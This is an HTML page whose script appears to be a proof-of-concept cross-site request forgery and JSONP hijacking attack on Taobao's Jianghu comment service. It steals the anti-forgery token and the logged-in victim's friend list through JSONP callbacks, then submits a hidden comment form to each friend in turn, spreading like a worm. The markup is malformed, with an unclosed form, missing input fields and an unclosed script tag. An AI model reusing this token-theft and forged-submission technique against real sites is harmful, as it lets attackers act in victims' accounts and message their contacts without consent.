    <body>

        <form style="visibility:hidden;"
            action="http://comment.jianghu.taobao.com/json/insert_comment.htm?&action=comment%2FCommentAction&event_submit_do_insert_comment=true&callback=CommentBox.onPostNew"

        <script type="text/javascript" src="http://assets.taobaocdn.com/tbra/1.0/tbra-widgets.js"></script>
        <script type="text/javascript">
            var Y = YAHOO.util, Dom = Y.Dom, Event = Y.Event;
            var getToken = function(a, b, c, d) {
                Dom.get('token').value = d.match('commenttbtoken=(.+)')[1];
            };
            ~function() {
                Y.Get.script('http://comment.jianghu.taobao.com/json/comment_list.htm?callback=getToken', {
                    onSuccess: function() {
                        Y.Get.script('http://jianghu.taobao.com/admin/json/spell_search_json.htm?nick=', {
                            onSuccess: function() {
                                if (_friendJson) {
                                    for (var i = 0, len = _friendJson.friendList.length; i < len; i++) {
                                        var friend = _friendJson.friendList[i];
                                        Dom.get('targetKey').value = friend.friendId;
                                        Dom.get('recUserId').value = friend.friendId;
                                        alert('Send to: ' + friend.friendNick);
                                        Dom.get('postForm').submit();
                                        if (confirm('break?')) {
                                            break;
                                        }
                                    }
                                }
                            }, charset: 'gbk'});
                    }, charset: 'gbk'
                });
            }();

    </body>
